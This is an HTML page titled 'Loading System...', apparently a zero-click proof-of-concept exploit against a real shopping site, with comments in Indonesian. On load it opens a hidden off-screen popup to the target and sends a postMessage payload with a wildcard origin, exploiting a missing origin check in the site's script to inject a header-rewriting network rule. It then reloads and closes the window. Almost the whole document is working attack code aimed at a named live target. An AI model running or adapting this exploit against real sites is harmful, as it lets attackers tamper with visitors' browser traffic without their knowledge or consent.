<!DOCTYPE html>
<html>
<head><title>Loading System...</title></head>
<body>
    <script>
        // Payload persis seperti yang sukses di console kemarin
        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "zero_click_pwn",
                global: true,
                conditions: [],
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer", // Pakai header yang sudah ada di pns_logic agar tidak error 100000
                    value: "VULNERABLE_ZERO_CLICK"
                }]
            }]
        };

        // Otomatis jalan saat halaman di-load
        window.onload = function() {
            // Membuka window kecil secara otomatis
            const pwn = window.open("https://shop-id.tokopedia.com/robots.txt", "_blank", "width=10,height=10,left=-1000,top=-1000");

            if (pwn) {
                setTimeout(() => {
                    // Mengirim pesan ke pns_logic.js tanpa origin check
                    pwn.postMessage(payload, "*");
                    
                    // Memaksa fetch agar rule langsung aktif
                    setTimeout(() => {
                        pwn.location.href = "https://shop-id.tokopedia.com/robots.txt?t=" + Date.now();
                    }, 500);

                    // Tutup setelah injeksi selesai
                    setTimeout(() => { pwn.close(); }, 2000);
                }, 3000); 
            } else {
                document.body.innerHTML = "<h1>Please enable pop-ups for Zero-Click Demo</h1>";
            }
        };
    </script>
</body>
</html>
